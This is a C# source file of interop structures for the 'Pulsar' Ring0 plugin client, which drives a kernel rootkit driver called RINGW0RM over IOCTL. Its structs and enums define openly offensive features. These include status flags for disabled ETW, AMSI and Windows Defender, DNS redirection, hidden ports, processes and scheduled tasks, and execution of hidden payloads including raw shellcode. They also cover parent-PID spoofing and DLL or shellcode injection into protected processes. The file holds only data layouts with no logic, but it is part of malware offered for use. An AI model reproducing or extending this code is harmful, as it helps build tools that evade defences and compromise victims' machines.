using System;
using System.Runtime.InteropServices;

namespace Pulsar.Plugin.Ring0.Client
{
    /// <summary>
    /// RINGW0RM Client-specific Types
    /// These are driver structures used only by the Client for IOCTL communication.
    /// Shared types (MessagePack DTOs) are in Pulsar.Plugin.Ring0.Common.Ring0Commands
    /// </summary>

    /// <summary>
    /// Boot diagnostics structure - matches driver's BOOT_DIAGNOSTICS
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct BootDiagnostics
    {
        [MarshalAs(UnmanagedType.U1)] public bool DriverConnected;
        [MarshalAs(UnmanagedType.U1)] public bool EtwDisabled;
        [MarshalAs(UnmanagedType.U1)] public bool AmsiCallbackRegistered;
        [MarshalAs(UnmanagedType.U1)] public bool DefenderRtpDisabled;
        [MarshalAs(UnmanagedType.U1)] public bool DefenderServiceDisabled;
        [MarshalAs(UnmanagedType.U1)] public bool PayloadConfigLoaded;
        [MarshalAs(UnmanagedType.U1)] public bool ProcessCallbackRegistered;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string PayloadPath;
        public uint PatchedProcessCount;
    }

    /// <summary>
    /// DNS Rule structure - matches driver's DNS_RULE
    /// MAX_DNS_RULES = 32, MAX_DOMAIN_LEN = 256
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DnsRule
    {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)] public string Domain;
        public uint RedirectIp;
        [MarshalAs(UnmanagedType.U1)] public bool InUse;
    }

    /// <summary>
    /// Blocked IP structure - matches driver's BLOCKED_IP
    /// MAX_BLOCKED_IPS = 64
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct BlockedIp
    {
        public uint Ip;
        public ushort Port; // 0 = all ports
        [MarshalAs(UnmanagedType.U1)] public bool InUse;
    }

    /// <summary>
    /// Hidden Port structure - matches driver's HIDDEN_PORT
    /// MAX_HIDDEN_PORTS = 64
    /// </summary>
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct HiddenPort
    {
        public ushort Port;
        [MarshalAs(UnmanagedType.U1)] public bool IsTcp;
        [MarshalAs(UnmanagedType.U1)] public bool InUse;
    }

    // ========================================================================
    // POST-EXPLOITATION STRUCTURES
    // ========================================================================

    /// <summary>
    /// Payload type for execution requests
    /// </summary>
    public enum PayloadType
    {
        Exe = 0,        // Executable (.exe)
        Bat = 1,        // Batch file (.bat)
        Ps1 = 2,        // PowerShell script (.ps1)
        Dll = 3,        // DLL injection
        Shellcode = 4   // Raw shellcode
    }

    /// <summary>
    /// Hidden process entry - matches driver's HIDDEN_PROCESS
    /// MAX_HIDDEN_PROCESSES = 32
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct HiddenProcess
    {
        public uint Pid;
        public uint ParentPid;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string ImagePath;
        public PayloadType PayloadType;
        [MarshalAs(UnmanagedType.U1)] public bool InUse;
    }

    /// <summary>
    /// Hidden task entry - matches driver's HIDDEN_TASK
    /// MAX_HIDDEN_TASKS = 32, MAX_TASK_NAME_LEN = 256
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct HiddenTask
    {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)] public string TaskName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string Command;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string Arguments;
        public uint TriggerType;  // 0=Boot, 1=Logon, 2=Schedule
        [MarshalAs(UnmanagedType.U1)] public bool InUse;
    }

    /// <summary>
    /// Request to run hidden process - matches driver's RUN_HIDDEN_REQUEST
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct RunHiddenRequest
    {
        public PayloadType PayloadType;
        public uint FakeParentPid;                  // 0 = no spoofing
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string Path;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string Arguments;
        public uint ShellcodeSize;
    }

    /// <summary>
    /// Request to inject into PPL - matches driver's PPL_INJECT_REQUEST
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct PplInjectRequest
    {
        public PayloadType PayloadType;
        public uint TargetPid;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)] public string TargetName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string DllPath;
        public uint ShellcodeSize;
    }

    /// <summary>
    /// Request to create hidden task - matches driver's CREATE_HIDDEN_TASK_REQUEST
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CreateHiddenTaskRequest
    {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)] public string TaskName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string Command;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string Arguments;
        public uint TriggerType;
    }

    /// <summary>
    /// Request to spawn with PPID spoof - matches driver's SPAWN_PPID_REQUEST
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SpawnPpidRequest
    {
        public uint FakeParentPid;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string ExecutablePath;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string Arguments;
        [MarshalAs(UnmanagedType.U1)] public bool HideAfterSpawn;
    }
}
